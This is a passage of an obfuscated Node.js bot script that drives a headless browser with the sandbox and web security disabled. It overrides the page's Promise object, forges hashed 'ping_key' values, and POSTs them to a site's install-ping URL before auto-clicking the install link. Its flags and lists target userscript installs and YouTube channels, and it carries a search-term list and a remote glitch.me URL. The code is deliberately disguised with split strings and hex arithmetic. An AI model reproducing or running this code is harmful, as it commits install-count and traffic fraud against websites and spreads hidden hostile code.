                return this['bytes'] > -0x27d33270 + 0x1ed35bb3f + -0x10 * 0xc56288d && (this['hBytes'] += this['bytes'] / (0x7e20d734 + 0x16df9ac6c + -0xec1a83a0) << 0x1d * -0x83 + 0x1d5f * 0x1 + 0x9b * -0x18, this['bytes'] = this['bytes'] % (0x4cd283b * 0x40 + -0xa * -0x1a92e9a6 + -0x1 * 0x13d072f3c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0xb5c * 0x1 + -0xb4a + 0x16a7;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x2c * -0x6b + 0x5 * 0x29c + -0xad * -0x8] = this['block'], J[K >> -0x23a3 + -0xe02 + -0x29d * -0x13] |= x[-0x2274 + 0x56 * -0x29 + 0x303d & K], this['block'] = J[-0x8db + -0x24b * -0x3 + 0x20a], K >= -0x1 * 0x1181 + -0xe84 + 0x203d && (this['hashed'] || this['hash'](), J[0x216b + 0xbc2 + -0x2d2d] = this['block'], J[0xc * 0x293 + 0x1359 + -0x322d] = J[-0x139 * 0xf + -0x4a4 + 0x2 * 0xb7e] = J[-0x1285 * 0x1 + -0x238 + 0x14bf] = J[-0x62 * 0x28 + -0x1 * -0xd54 + 0x1 * 0x1ff] = J[-0x1d9b + 0x1c02 + 0x19d] = J[-0x16b * 0xd + -0x1255 + 0xdb * 0x2b] = J[-0xb59 + -0x9e * -0x30 + -0x1241] = J[0xf40 + -0x4 * 0x65b + 0xa33] = J[0x144a + -0xbad + -0x1 * 0x895] = J[-0x4e + 0x2697 + -0x11 * 0x240] = J[0x1f9c + -0x1 * -0x118d + 0x19 * -0x1f7] = J[0x25b3 + 0x7f0 + 0x2 * -0x16cc] = J[-0x19f0 + -0x3 * -0x331 + -0x1 * -0x1069] = J[-0x2686 + 0x4fa + -0x2199 * -0x1] = J[-0x2193 + 0x1 * -0x21e5 + -0x43 * -0x102] = J[0x9c7 * -0x1 + -0xb * -0x16f + -0x5ef] = 0x121 + -0x714 + -0x5f3 * -0x1), J[0x88e + -0x24c0 + -0x1 * -0x1c40] = this['hBytes'] << -0x1076 * 0x1 + 0x1 * 0x1f4 + 0x19d * 0x9 | this['bytes'] >>> 0x13 * -0xf9 + 0x1 * 0x43e + -0xb * -0x14e, J[0x10 * 0x1b2 + -0x1 * -0x63d + 0x1 * -0x214e] = this['bytes'] << 0x1f04 + -0x1b09 + -0x8 * 0x7f, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1a7 * 0xd + -0x1b6f + 0x604; J < 0x1da8 + 0x109 * 0x4 + -0x85f * 0x4; ++J)
                K = Q[J - (-0x287 * 0x5 + 0xeb * 0x6 + 0x724 * 0x1)] ^ Q[J - (-0xdce + 0x7 * -0x11b + 0x1593)] ^ Q[J - (-0x103c * 0x1 + -0x67 * -0x9 + -0x8d * -0x17)] ^ Q[J - (-0x4d * 0x4f + -0x12af + 0x2 * 0x1541)], Q[J] = K << 0x6 * 0x123 + -0x1a42 + -0x7 * -0x2c7 | K >>> -0x69f * 0x3 + 0x6be * 0x1 + 0xd3e;
              for (J = 0x1054 + 0x1 * -0x1c2d + -0xbd9 * -0x1; J < 0x20b8 + 0x4 * -0x41 + -0x1fa0; J += 0x1239 + 0x2043 + -0x3277)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1d5d * -0x1 + 0xcd * 0xb + -0xe5 * -0x17 | L >>> 0x95 * 0x11 + -0x8c6 * -0x2 + -0x1b56) + (M & N | ~M & O) + P + (-0x6abd0a1e + -0x96e27 * 0x127d + 0x173990ac2) + Q[J] << 0xd * 0x1d + -0x268e + -0xb * -0x35f) << -0x11cb + -0xd6e + 0x1f * 0x102 | P >>> -0x1 * 0x2118 + -0x6b * 0x34 + 0x36ef) + (L & (M = M << 0x1 * -0x1bf9 + -0x3 * -0x87f + 0x29a | M >>> -0xf82 + -0xb51 * -0x3 + -0x126f) | ~L & N) + O + (0xfa5 * -0x2a669 + -0x1258cf9 * 0x26 + -0x21500c * -0x545) + Q[J + (0x1 * -0x1ab3 + 0x2019 + -0x1 * 0x565)] << 0x75 * -0x47 + 0x18fa + 0x779) << -0x65c + -0x234 + 0x895 | O >>> -0x2 * -0x4bc + -0x113 * 0x24 + -0x3 * -0x9c5) + (P & (L = L << -0xe5f + -0x1eaf + 0x2d2c | L >>> 0x5 * 0x2df + -0x1de + -0xc7b) | ~P & M) + N + (-0xac12f51e + -0xc5363f4 + -0x112e8d2ab * -0x1) + Q[J + (-0x25b * 0x1 + 0x1 * 0x1591 + -0x1334)] << 0x2364 + 0x7 * 0x1cd + 0x45d * -0xb) << 0x111b + 0x21d4 * -0x1 + 0x2 * 0x85f | N >>> -0x1996 * -0x1 + -0x28 * -0x15 + -0x1cc3) + (O & (P = P << 0x19 * -0x4f + 0x126 * -0x8 + 0x1105 | P >>> 0x8 * -0x169 + -0x1e * -0xc3 + -0xb90) | ~O & L) + M + (0x1d * -0x34640b3 + -0x7 * 0x100d812d + -0x4720149 * -0x43) + Q[J + (0x9e * 0x12 + 0x2 * 0xcdb + 0x1b * -0x15d)] << 0x21df + 0x12fd * 0x1 + 0xc7 * -0x44) << 0x15c4 + -0x896 + -0xd29 | M >>> -0x19cd + -0x1172 + 0x2b5a) + (N & (O = O << -0x17 * -0x6b + 0x6d * 0x5 + -0xba0 | O >>> -0x159 + 0x10da + -0xf7f) | ~N & P) + L + (-0xb04c3936 + 0x4a0ae190 + 0xc0c3d13f) + Q[J + (0x14d * 0x5 + 0x1a9b + 0x2 * -0x108c)] << 0x208a + -0x18f2 + -0x798, N = N << 0xb97 + 0x24ea + -0x3063 | N >>> -0x1 * 0x105 + 0xec * 0x19 + -0x3 * 0x757;
              for (; J < -0x19d7 + -0x1a30 + -0x49 * -0xb7; J += -0x16c * -0x3 + -0x1e6e + -0x1a2f * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4c1 * -0x1 + -0x1 * -0x1606 + -0x228 * 0x8 | L >>> -0x2 * -0xd37 + 0xc08 + -0xcc9 * 0x3) + (M ^ N ^ O) + P + (-0x2d748a68 + 0x126 * 0x212144 + 0x764241f1) + Q[J] << 0x2c6 + 0x491 + 0x1 * -0x757) << -0xebd + -0x21 * 0x10d + 0x316f | P >>> -0x2 * -0x6c5 + -0xd88 + 0x19) + (L ^ (M = M << -0x1 * -0x264e + -0xa40 + -0x1bf0 | M >>> -0x22ec + 0x2098 + 0x256) ^ N) + O + (-0x9c8566ca + -0x293b2c4 * 0x21 + 0x138cd * 0x1206b) + Q[J + (-0x13ec + -0x176e + -0x1 * -0x2b5b)] << 0x1 * 0x6ad + -0x1 * 0xef8 + 0x84b) << 0xe9e + -0x4 * -0x661 + -0x281d | O >>> -0xc7 * -0x1a + 0x2c3 * -0xa + -0x1 * -0x783) + (P ^ (L = L << -0x5ea * 0x3 + -0x2369 + -0x419 * -0xd | L >>> 0x3ee * 0x1 + -0x76a + 0x37e) ^ M) + N + (0x159f90ee * 0x8 + 0x84e2a843 + 0x2 * -0x6182a209) + Q[J + (0x3 * -0x2a9 + -0x3d * 0x81 + 0x26ba)] << 0x1 * -0x157d + -0x199 * 0x7 + 0x52 * 0x66) << 0x1683 + -0x212 * 0x1 + -0x146c | N >>> -0x13 * -0x49 + 0xb00 + -0x1050) + (O ^ (P = P << 0x700 * 0x4 + -0x1ef6 + 0x18a * 0x2 | P >>> -0x5 * -0x35f + -0xc * -0xa9 + -0x11 * 0x175) ^ L) + M + (-0x8c74be5c + 0x1 * -0xae3032cd + -0x1 * -0x1a97edcca) + Q[J + (-0x1 * 0x1414 + 0x10 * -0x9f + -0x1e07 * -0x1)] << 0xf22 + 0x155c * -0x1 + 0x63a) << 0x4b * -0x57 + 0x19e5 * 0x1 + -0x63 | M >>> -0x73f + -0xb7a + 0x12d4) + (N ^ (O = O << 0xe4 + 0x314 * 0x1 + -0x11 * 0x3a | O >>> 0xbb4 + -0x1 * 0x18d7 + 0xd25) ^ P) + L + (0x12bfe585 + 0x6dd * -0x1f42bb + 0xa1 * 0x1e798ab) + Q[J + (-0x1593 + -0x1 * -0x911 + -0x643 * -0x2)] << -0xb * 0x2b1 + -0x279 + -0x805 * -0x4, N = N << -0xe2 * 0x2 + 0x10cb * 0x1 + -0xee9 | N >>> 0x1 * -0x1002 + -0x1155 + -0x1 * -0x2159;
              for (; J < 0x25e7 + -0x49f * -0x4 + -0x73 * 0x7d; J += -0x963 + 0x1104 + -0x79c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x125a + -0x3 * 0x9a4 + 0x1 * 0xa97 | L >>> -0x496 + -0x55a * 0x4 + -0x189 * -0x11) + (M & N | M & O | N & O) + P - (-0x1acb95eb + -0xc0659fa2 + -0x14c1578b1 * -0x1) + Q[J] << 0x17 * -0x106 + 0x31 * 0xab + -0x1 * 0x931) << -0x263b * -0x1 + 0xd6 + -0x54 * 0x77 | P >>> 0x1c7c * 0x1 + 0x15 * -0x26 + -0x1 * 0x1943) + (L & (M = M << -0x33d + -0x158f * 0x1 + -0xc75 * -0x2 | M >>> -0x6aa + 0x239f + 0x1 * -0x1cf3) | L & N | M & N) + O - (0x5f * 0x171729e + -0x2a3e6169 + -0x1 * -0x12091beb) + Q[J + (-0x1d25 * -0x1 + -0xdc0 + -0xf64)] << -0x5c * 0x53 + -0xbed * -0x1 + -0x11e7 * -0x1) << -0xda7 + -0x45 * 0x7d + -0x5 * -0x979 | O >>> -0x23 * -0x4 + 0x505 + -0x576) + (P & (L = L << 0x5b5 * 0x1 + 0x14f7 + -0x1a8e | L >>> -0x86f * -0x1 + 0x1 * 0x52 + 0x1 * -0x8bf) | P & M | L & M) + N - (0x428a50e6 + 0x77e9 * -0x18091 + 0xe27b5d37) + Q[J + (-0xa * -0x267 + -0x1667 + -0x19d)] << -0x12b * 0x1d + 0x1bff * 0x1 + 0x5e0) << -0xa * 0x6e + 0x179 * 0x14 + -0x1923 | N >>> -0xbc6 + 0x179a + 0x1 * -0xbb9) + (O & (P = P << 0x10f2 + 0x1 * 0xbb7 + -0x1c8b | P >>> -0x5e5 + 0x1a04 + 0x141d * -0x1) | O & L | P & L) + M - (0x16816 * 0x48d9 + 0x6d135c4 + -0x12ee * -0x30cb) + Q[J + (-0x11d3 + -0x18ce + -0xaa9 * -0x4)] << 0x1 * 0x1acf + 0x7b * -0x4f + 0xb26) << -0x32 * -0x4a + 0x1 * 0x1712 + -0x2581 | M >>> -0x12b6 + -0x12de + -0xb * -0x36d) + (N & (O = O << 0xa6 + -0x13bc + -0x4cd * -0x4 | O >>> -0x10e7 + 0x826 + 0x8c3) | N & P | O & P) + L - (0x26b983 * 0x40f + 0xb96560f * -0x3 + 0x4c1d2ae * -0x2) + Q[J + (-0x3 * 0x38a + -0xc9f + 0x1741 * 0x1)] << 0xe * -0xcd + -0x1 * -0x1ef3 + -0x13bd, N = N << 0x1 * 0x13cb + 0x3 * 0x9ad + -0x30b4 | N >>> 0x24b2 * 0x1 + 0xc18 + -0x4 * 0xc32;
              for (; J < -0x283 * -0x7 + 0x1d3f + -0x2e84; J += -0x1365 * 0x1 + 0xe7f + -0x1 * -0x4eb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x102 + -0x2077 + -0x2 * -0x10bf | L >>> 0x11c1 + -0x2016 + 0xe70) + (M ^ N ^ O) + P - (-0xb812703 * -0x5 + 0x190a2 * 0x480 + -0xaf35de5) + Q[J] << 0x1c3 + -0x17da + -0x41 * -0x57) << 0xf65 + 0x49 * 0x73 + -0x461 * 0xb | P >>> 0x2 * -0x62 + -0xbf0 + 0xccf) + (L ^ (M = M << -0x1c1c + 0x1297 + 0x9a3 | M >>> -0x1b48 + -0xff1 * -0x1 + -0x23 * -0x53) ^ N) + O - (-0x59f1bc33 + 0x2afc0050 + -0x295 * -0x26f399) + Q[J + (-0x2da * 0x3 + -0x1952 + 0x21e1)] << -0x1 * 0x2459 + 0x137 + 0x2322) << 0x7 * -0x2a0 + -0xa48 + 0x1cad | O >>> -0x1c24 + 0x1169 + 0x2 * 0x56b) + (P ^ (L = L << 0x1 * -0x2162 + -0x1743 * -0x1 + 0xa3d | L >>> 0x8d1 * 0x1 + 0x25b + 0x595 * -0x2) ^ M) + N - (-0x66 * -0x7814be + -0x5191669f + 0xf0405 * 0x5d1) + Q[J + (-0x1 * -0x1a87 + -0x10d4 + -0x9b1 * 0x1)] << 0x8e0 + 0xbc5 * -0x2 + 0xeaa) << 0x1fd3 + 0x1 * -0x75d + 0x1 * -0x1871 | N >>> -0x1689 + 0x266e + -0xfca) + (O ^ (P = P << 0xa02 + -0x1f4d * 0x1 + -0x7 * -0x30f | P >>> 0x9 * 0x16 + -0x13f7 + 0x1333) ^ L) + M - (-0x26ccee0a + 0x6a7261f4 + -0x1c106b8 * 0x8) + Q[J + (0x1933 + -0xfa1 * 0x1 + -0x98f)] << 0x2485 + -0x254c + 0xc7) << 0x1c7c + 0x1209 + -0x174 * 0x20 | M >>> 0x1 * 0x2645 + 0x1bd8 + -0xee * 0x47) + (N ^ (O = O << 0x105 * -0x5 + -0xd33 * 0x1 + 0x126a | O >>> -0x224e + -0x2b * 0x3 + 0x22d1) ^ P) + L - (0x42e4b461 + 0x52176353 + -0x5f5ed98a) + Q[J + (0x9c1 + 0x203a + -0x29f7)] << 0x4f7 * -0x2 + 0x1292 * 0x1 + -0xe * 0x9e, N = N << -0x1af6 * 0x1 + 0x1 * 0xec3 + 0xc51 | N >>> 0xaba + 0x1f43 + 0x3d1 * -0xb;
              this['h0'] = this['h0'] + L << 0x2 * 0xf4d + -0x8b * -0x6 + 0xc5 * -0x2c, this['h1'] = this['h1'] + M << 0x2302 + 0x1d56 + -0x4058, this['h2'] = this['h2'] + N << -0x1382 + -0xcad + 0x202f, this['h3'] = this['h3'] + O << 0x89 * 0x3d + 0x21f9 + -0x429e, this['h4'] = this['h4'] + P << -0x1357 + 0x762 + 0xbf5;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1c7 * 0xd + 0x1 * 0xc9f + 0xa98 & -0xb13 + 0x210a + -0x15e8] + w[J >> 0x1 * -0xdc + -0x1f68 + -0x26 * -0xda & 0x13 * 0x2d + 0x1377 * 0x1 + -0x795 * 0x3] + w[J >> 0x723 + 0x1e28 + -0x2537 & -0x1437 + 0xaba + 0x98c * 0x1] + w[J >> 0xf67 * 0x1 + 0xf97 * 0x1 + -0x1eee & -0xde7 + -0x2578 + 0x1 * 0x336e] + w[J >> -0x1779 + -0xa1c + 0x21a1 & 0x97f + 0x1 * 0xf9d + -0x190d] + w[J >> 0x1 * 0x26dd + -0x33 + 0x7ba * -0x5 & -0x163a + -0x18be + 0x2f07] + w[J >> 0x2528 + -0xca * -0xd + 0x2 * -0x17b3 & -0x5a9 * 0x3 + 0x3 * -0x289 + 0x1 * 0x18a5] + w[0x1b2e + -0x6ce + -0x1451 & J] + w[K >> 0x2666 + 0x688 + -0x2cd2 & 0x46c * 0x1 + 0x3 * 0x40e + -0x1087] + w[K >> 0x1555 + -0x8 * -0x3f7 + -0x34f5 & -0x8 * 0x1cb + 0x5f8 + 0x11 * 0x7f] + w[K >> -0x1e8 * 0x8 + 0x3d * -0xe + 0x2 * 0x955 & 0x5b5 * -0x1 + -0x26dd * -0x1 + -0x1 * 0x2119] + w[K >> 0x1c * 0x14c + 0x3 * -0x8a8 + -0xa48 & -0x2261 + -0x1fd * 0xd + -0x57b * -0xb] + w[K >> 0x740 + -0xd55 * 0x1 + 0x20b * 0x3 & -0x15d6 + 0x1ee1 + -0x8fc] + w[K >> -0x1ade + 0x12c2 + 0x824 & -0x1 * 0x1511 + -0x2563 + 0x3a83] + w[K >> -0x23 * 0x53 + -0x15bc + -0x1 * -0x2119 & 0x211c + 0x11c7 + -0x32d4] + w[0x349 + 0x5e + -0x398 & K] + w[L >> -0x140e * -0x1 + 0x2 * 0xe3e + -0x1 * 0x306e & 0x1200 + -0xb92 * -0x1 + -0x1d83 * 0x1] + w[L >> 0x5ca + -0x1 * -0x21ce + -0x2780 & -0x183d * 0x1 + 0x12bf + 0x58d] + w[L >> 0x1c * -0x83 + 0x4ed * 0x7 + -0x1413 & 0x31 * -0x9 + -0x75e + 0x926] + w[L >> -0x6 * -0x1eb + -0x7f3 * -0x4 + -0x2b3e & 0xd * -0x134 + 0x1 * 0x1901 + 0x31a * -0x3] + w[L >> 0x63 * -0x1 + -0x2 * -0x626 + -0xbdd & -0x1ef + 0x3 * 0xde + -0x9c] + w[L >> -0xcf + -0x3a * 0x29 + 0x1 * 0xa21 & -0xfa7 * 0x1 + -0x39 * 0x3f + -0x17 * -0x14b] + w[L >> 0x2699 + 0xa5e + -0x30f3 & -0x262f + -0x1 * 0x1d95 + 0x1 * 0x43d3] + w[-0x2499 + 0xdc0 + 0x16e8 & L] + w[M >> -0x4 * -0x534 + -0xa * -0x388 + -0x3804 & -0x2 * -0xdbe + 0x6ad + 0x5 * -0x6d2] + w[M >> -0x89 * 0x1a + -0x3 * -0x7d0 + 0x96e * -0x1 & 0x6ff + 0x24f6 + -0x6 * 0x751] + w[M >> -0x11 * -0xa8 + 0x19bb + -0x24cf & -0x1d23 * 0x1 + -0x23ca * 0x1 + 0x40fc] + w[M >> 0x745 + -0x1f1 * -0x5 + -0x10ea & 0x3 * 0xc13 + -0x3 * -0xc9d + -0x4a01] + w[M >> -0xdf9 + -0x1 * 0x1aa7 + -0x1 * -0x28ac & 0x20b5 + -0x501 * -0x4 + -0x34aa] + w[M >> -0x6 * 0x2b3 + 0x8c9 * -0x3 + 0x2a95 & 0xb02 + 0x1124 + -0x1c17] + w[M >> 0x10a5 + -0x3 * 0xb75 + 0x11be & -0x1 * -0x902 + -0x22ab + -0x66e * -0x4] + w[-0xa1e + 0x15c5 + 0x1c * -0x6a & M] + w[N >> 0x1777 + 0x24f8 + -0x3c53 & 0x2 * -0x206 + -0x233 * -0x1 + 0x1e8] + w[N >> -0x31d + 0x8d * 0x2 + -0x4d * -0x7 & 0x57 * -0x6d + -0xa * -0x1a3 + 0x14bc] + w[N >> 0xb14 * 0x2 + -0x14 * 0x16e + 0x22c * 0x3 & 0x174 * -0x1 + 0x3 * -0xb23 + -0x1176 * -0x2] + w[N >> 0x7 * 0x8 + -0x1 * -0xec5 + -0xeed & 0x1 * 0x1c24 + 0x1 * -0x191b + 0x2fa * -0x1] + w[N >> 0x1179 + 0x7e + -0x11eb & -0x22f8 + -0x234 + -0x9 * -0x423] + w[N >> -0xc09 * 0x1 + -0xe3b + 0x1a4c & -0x2fa + -0x24ad + 0x27b6] + w[N >> 0x7 * 0x481 + -0x1a3a + -0x549 & -0x2679 + 0xa9 * -0x23 + -0x1f * -0x1fd] + w[-0x32e + 0x8d2 + -0x595 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * -0x795 + 0xed * 0xd + -0x45c & -0x128f * 0x1 + 0xa16 + 0x978,
                J >> 0x1ffa + -0x2043 + 0x59 & 0x121 + 0x22 * 0xdf + 0x440 * -0x7,
                J >> -0x710 + 0x1 * 0x1035 + -0x91d * 0x1 & 0x14d * 0x18 + -0x1 * 0x1d2c + -0x10d,
                -0x17 * 0xf2 + 0x2492 + -0x1 * 0xdd5 & J,
                K >> 0x1c75 + 0x1 * -0x258f + -0x16 * -0x6b & -0x1b8e + 0x359 * -0x1 + 0x6 * 0x551,
                K >> 0x1d1a + -0x1810 + 0xb6 * -0x7 & 0x1d02 * -0x1 + 0x2418 + -0x617,
                K >> 0x7 * -0x153 + -0x24 * -0x45 + -0x1 * 0x67 & -0x1aad + 0xeb1 + 0xcfb,
                0x1081 + 0x1 * 0x15b2 + -0x2534 & K,
                L >> 0x20 * 0x112 + 0x2113 + -0x3 * 0x1669 & 0x1 * 0x1c34 + 0x2164 + -0x3c99,
                L >> 0x25c0 + 0x4b1 * 0x5 + -0x3d25 & 0xc5b * -0x1 + 0xb23 + -0x15 * -0x1b,
                L >> -0x14f9 + -0x37 * 0x42 + 0x232f * 0x1 & -0x2a * 0xc7 + 0xe24 * -0x1 + -0x3ad * -0xd,
                -0x35f + 0x264 + 0x1fa & L,
                M >> 0x254d + -0x5e7 + -0x1f4e * 0x1 & 0x1 * -0x2257 + -0xe9e * -0x1 + -0x18 * -0xdd,
                M >> -0x122b + -0x278 * -0xa + -0x675 & -0x957 * -0x4 + 0x13fb + -0x70b * 0x8,
                M >> 0x12e * 0x17 + 0x3 * -0x897 + -0xb * 0x1f & -0x17b3 + 0x859 + -0xf * -0x117,
                -0x7c2 + 0x13 * -0xeb + -0x1 * -0x1a32 & M,
                N >> 0x8d2 + 0x393 + -0xc4d & 0xb * 0x2f6 + 0x1 * 0x1eb2 + 0x13 * -0x347,
                N >> 0x1136 + 0x1d6 * -0xe + 0x88e & -0xadb * 0x1 + -0x2 * -0x4cf + 0x23c,
                N >> 0x2 * -0xe3 + 0x133 * -0x12 + 0xc * 0x1f3 & -0x1cdb + -0xdc8 + 0x1 * 0x2ba2,
                0x1886 + 0xb6d + -0x1 * 0x22f4 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x9c5 + -0x2055 + 0x2 * 0x1517), (K = new DataView(J))['setUint32'](0x455 * -0x6 + -0x219e + 0x8c * 0x6d, this['h0']), K['setUint32'](-0x10a * -0x21 + 0x62f * -0x1 + -0x2f * 0x99, this['h1']), K['setUint32'](-0x14be + 0x11de * 0x1 + 0x2e8, this['h2']), K['setUint32'](-0x1 * 0x21b9 + -0xcb * 0x11 + -0x24 * -0x150, this['h3']), K['setUint32'](0x1 * 0x38c + 0x20d7 * -0x1 + -0x1f5 * -0xf, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x202f * 0x1 + 0x141f + 0x8 * 0x182];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x25 * 0x5 + -0x1df0 * -0x1 + -0x1ea9;
            J[0x23cf + -0x29 * -0x7f + -0x1 * 0x3826]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x7cf * 0x5 + -0xd * 0x247 + -0x44a6 * -0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x497 * -0x4 + 0x2460 + -0x3 * 0x601), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x337 + 0x1 * -0xc7 + 0x3ff;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x20c7 * 0x1 + 0xb * -0x3b + -0x1 * 0x1862), Promise['resolve'](-0x64 * 0x53 + -0x2 * -0x10b1 + -0xf5);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1288 + 0x2016 + -0x329e; j < 0x20ed + -0x1 * 0xbcd + -0x151f; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x216b + -0x257 + 0x23c2);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = -0x9 * 0x117 + -0x2f39 + -0x2 * -0x2c24 + (0x1 * 0x173b + -0xb * 0x24f + 0xde2) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x3c5 + 0xb49 + -0x1 * 0x781) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + T(0xa),
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    U(0xc, 'VzzM') + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * 0x26dd + -0x113f + -0x2 * 0xacf; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const V = c;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this[V(0x9)])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + U(0x6, 'FAPx') + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 